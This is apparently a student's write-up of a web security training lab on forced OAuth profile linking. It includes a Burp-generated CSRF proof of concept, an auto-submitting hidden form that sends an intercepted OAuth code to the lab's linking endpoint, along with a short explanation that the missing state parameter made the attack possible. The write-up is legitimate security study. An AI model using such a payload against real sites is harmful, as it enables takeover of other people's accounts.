# Practitioner Lab 140: Forced OAuth profile linking

---

This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.

To solve the lab, use a [CSRF attack](https://portswigger.net/web-security/csrf) to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.

The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:

- Blog website account: `wiener:peter`
- Social media profile: `peter.wiener:hotdog`

![Untitled](Practitioner%20Lab%20140%20Forced%20OAuth%20profile%20linking%20581e1e7f9f194c33913f738a7f7d2e37/Untitled.png)

I intercepted this code from clicking on the link account. but before it was used I used burp to create a poc and put it on the exploit server. 

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a6c0043031716ac81f9c5ec00020069.web-security-academy.net/oauth-linking">
      <input type="hidden" name="code" value="Gpj4VupahNy8gsjhbaKJLLEis4a1mGnBclGQLPQMn7P" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

When I logged back in using the account it solved the lab.

This was then delivered to the user and it solved the lab. 

![Untitled](Practitioner%20Lab%20140%20Forced%20OAuth%20profile%20linking%20581e1e7f9f194c33913f738a7f7d2e37/Untitled%201.png)

This attack worked because It had no state 

```
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com
```

On top is how it wouldve looked it if had a state.